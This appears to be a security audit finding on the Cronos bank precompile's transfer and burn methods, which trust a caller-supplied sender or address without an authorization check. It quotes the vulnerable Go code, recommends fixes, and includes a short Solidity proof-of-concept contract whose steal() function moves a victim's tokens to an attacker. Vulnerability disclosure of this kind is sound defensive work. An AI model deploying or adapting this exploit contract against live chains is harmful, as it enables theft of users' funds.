### Title
Unauthorized Token Transfer via Unauthenticated `sender` in Bank Precompile `transfer` Method - (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts the `sender` address as a caller-supplied ABI argument with no check that the calling contract is authorized to move that address's tokens. Any EVM contract can invoke the precompile and pass an arbitrary victim address as `sender`, causing the bank module to transfer the victim's `evm/<contract_address>`-denom tokens to an attacker-controlled address.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `transfer` method as follows:

```go
sender := args[0].(common.Address)   // taken from ABI input — no auth check
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<calling_contract_address>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `denom` is correctly scoped to the calling contract (`EVMDenom(contract.Caller())`), but the `sender` (the `from` account for `SendCoins`) is taken directly from the ABI-encoded input with **no verification** that:
- `sender == contract.Caller()`, or
- the `sender` has granted an allowance to the calling contract.

Contrast this with `mint`/`burn`, where the only address argument is the target (`recipient`/`addr`) and the calling contract implicitly authorizes the operation by being the caller. For `transfer`, the calling contract is supposed to have already verified the user's consent, but the precompile enforces nothing. [2](#0-1) 

The `EVMDenom` function confirms the denom namespace is `evm/<hex_address>`: [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

A malicious contract can:
1. Mint `evm/<MaliciousContract>` tokens to users (e.g., as part of a DeFi protocol or airdrop).
2. At any later time, call the bank precompile's `transfer(victim, attacker, amount)` with the victim's address as `sender`.
3. The bank module executes `SendCoins(victim → attacker, evm/<MaliciousContract>)` with no consent from the victim.

Because `evm/<contract_address>` denoms are native bank-module coins (not EVM storage), the theft bypasses any ERC20 allowance mechanism. The victim has no on-chain way to revoke this capability once they hold the denom.

The same structural flaw applies to `burn`: a malicious contract can call `burn(victim, amount)` to destroy a victim's tokens without consent, since `addr` is also taken from ABI input without an authorization check. [4](#0-3) 

### Likelihood Explanation

Any unprivileged EVM contract can call the bank precompile at address `0x0000000000000000000000000000000000000064`. No special permissions, governance approval, or key compromise is required. The attacker only needs to have previously minted the denom to the victim — a normal operation for any token-issuing contract. [5](#0-4) 

### Recommendation

Add an authorization guard in the `transfer` case that enforces `sender == contract.Caller()`:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    // ADD: caller must be the sender, or an approved spender
    if sender != contract.Caller() {
        return nil, errors.New("transfer: sender must be the calling contract")
    }
    ...
```

Alternatively, redesign the method so that the calling contract is always the implicit sender (matching the `mint`/`burn` pattern), and expose a separate `transferFrom(owner, spender, recipient, amount)` that validates an on-chain allowance stored in the bank precompile.

The same fix should be applied to the `burn` case, where `addr` (the account whose tokens are burned) is also taken from ABI input without verifying that the calling contract is authorized to burn on behalf of that address. [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankPrecompile constant BANK = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: Attacker mints evm/<this_contract_address> tokens to victim
    function airdrop(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: At any time, attacker steals victim's tokens — no approval needed
    function steal(address victim, address attacker, uint256 amount) external {
        // sender = victim, but no authorization check in precompile
        BANK.transfer(victim, attacker, amount);
    }
}
```

`steal()` succeeds because `bank.go` line 192 calls `bankKeeper.SendCoins(ctx, from, to, ...)` where `from` is the victim's address supplied by the attacker, with no check that `from == contract.Caller()`. [7](#0-6)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-33)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L103-204)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	default:
		return nil, errors.New("unknown method")
	}
}
```
